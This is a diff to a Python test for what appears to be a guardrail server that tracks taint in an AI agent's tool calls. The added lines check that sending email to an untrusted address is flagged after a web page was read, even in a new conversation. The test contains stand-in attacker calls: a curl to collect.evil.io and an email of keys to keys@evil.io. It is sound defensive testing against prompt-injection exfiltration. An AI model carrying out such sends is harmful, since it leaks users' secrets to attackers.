@@ -672,7 +672,12 @@ def test_taint_checks(c, monkeypatch):
     d = post("email.send", {"to": "maya@customer.example"})                  # from our own CRM, not the web page
     assert d["decision"] == "allow" and [x["check"] for x in d["signals"]] == ["after_untrusted"]
     assert post("Bash", {"command": "curl -s https://collect.evil.io/readme"})["signals"] is None   # downloading sends nothing
-    assert post("email.send", {"to": "keys@evil.io"}, session="clean-session")["signals"] is None   # nothing untrusted read here
+    d = post("email.send", {"to": "keys@evil.io"}, session=f"next-{s}")     # a new conversation remembers the page
+    assert d["rule_id"] == "taint:untrusted_destination" and "in another conversation" in d["reason"]
+    held.append(d["event_id"])
+    monkeypatch.setitem(server.policy.taint, "scope", "session")
+    assert post("email.send", {"to": "keys@evil.io"}, session=f"clean-{s}")["signals"] is None   # nothing read here
+    monkeypatch.setitem(server.policy.taint, "scope", "identity")
 
     monkeypatch.setitem(server.policy.taint, "untrusted_destination", "off")
     monkeypatch.setitem(server.policy.taint, "after_untrusted", "off")
